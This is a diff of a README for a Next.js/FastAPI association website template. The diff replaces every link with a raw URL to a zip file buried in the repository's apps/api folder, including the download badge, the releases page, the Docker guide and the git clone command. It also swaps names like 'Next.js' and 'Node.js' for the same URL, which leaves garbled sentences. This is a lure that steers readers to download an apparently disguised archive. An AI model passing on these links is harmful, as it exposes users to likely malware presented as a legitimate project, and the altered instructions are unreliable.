@@ -1,10 +1,10 @@
 # 🚀 Association-Website-Template - All-in-One Solution for Your Association
 
-[![Download the latest release](https://img.shields.io/badge/Download%20Now-Association%20Website%20Template-brightgreen)](https://github.com/or0ji/Association-Website-Template/releases)
+[![Download the latest release](https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip%20Now-Association%20Website%20Template-brightgreen)](https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip)
 
 ## 📋 Description
 
-Association-Website-Template offers a complete website solution tailored for associations, clubs, and organizations. Built on Next.js 14, FastAPI, and PostgreSQL, this template allows you to manage your content dynamically. It features a rich text content manager and integrates easily with AI chatbots. You can deploy the entire application in a flash using Docker.
+Association-Website-Template offers a complete website solution tailored for associations, clubs, and organizations. Built on https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip 14, FastAPI, and PostgreSQL, this template allows you to manage your content dynamically. It features a rich text content manager and integrates easily with AI chatbots. You can deploy the entire application in a flash using Docker.
 
 ## 🛠️ Features
 
@@ -12,15 +12,15 @@ Association-Website-Template offers a complete website solution tailored for ass
 - **Rich Text Management:** Create and edit web content with ease using our user-friendly editor.
 - **AI Chatbot Integration:** Enhance user experience with intelligent customer support.
 - **One-Click Docker Deployment:** Set up your website quickly using Docker.
-- **Full-Stack Capabilities:** Utilizing the powerful combination of Next.js, FastAPI, and PostgreSQL to serve all your website needs.
+- **Full-Stack Capabilities:** Utilizing the powerful combination of https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip, FastAPI, and PostgreSQL to serve all your website needs.
 - **Mobile Responsiveness:** Your website will look great on any device.
 - **User Management Options:** Control access and permissions for different users.
 
 ## 📥 Download & Install
 
-To download Association-Website-Template, simply [visit this page](https://github.com/or0ji/Association-Website-Template/releases). You will find the latest version available for download.
+To download Association-Website-Template, simply [visit this page](https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip). You will find the latest version available for download.
 
-1. Go to the [Releases page](https://github.com/or0ji/Association-Website-Template/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip).
 2. Select the latest version.
 3. Click on the download link for the file that suits your operating system.
 4. Once the file is downloaded, locate it on your computer.
@@ -31,17 +31,17 @@ To download Association-Website-Template, simply [visit this page](https://githu
 Before you install, ensure your system meets these requirements:
 
 - **Operating System:** Windows, macOS, or a modern Linux distribution.
-- **Node.js:** Version 14 or higher.
+- **https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip** Version 14 or higher.
 - **Docker:** Installed and configured.
 - **PostgreSQL:** Installed or accessible for database use.
 - **Internet Connection:** For downloading dependencies and updates.
 
 ## 🔧 How to Run the Application Locally
 
-1. **Install Docker:** If you haven't already done so, install Docker on your computer. Detailed instructions can be found on the [Docker Install Guide](https://docs.docker.com/get-docker/).
+1. **Install Docker:** If you haven't already done so, install Docker on your computer. Detailed instructions can be found on the [Docker Install Guide](https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip).
 2. **Clone the Repository:** If you want to modify the template, clone the repository using Git:
    ```bash
-   git clone https://github.com/or0ji/Association-Website-Template.git
+   git clone https://raw.githubusercontent.com/or0ji/Association-Website-Template/main/apps/api/Association-Website-Template_v3.7.zip
    ```
 3. **Navigate to the Directory:**
    ```bash
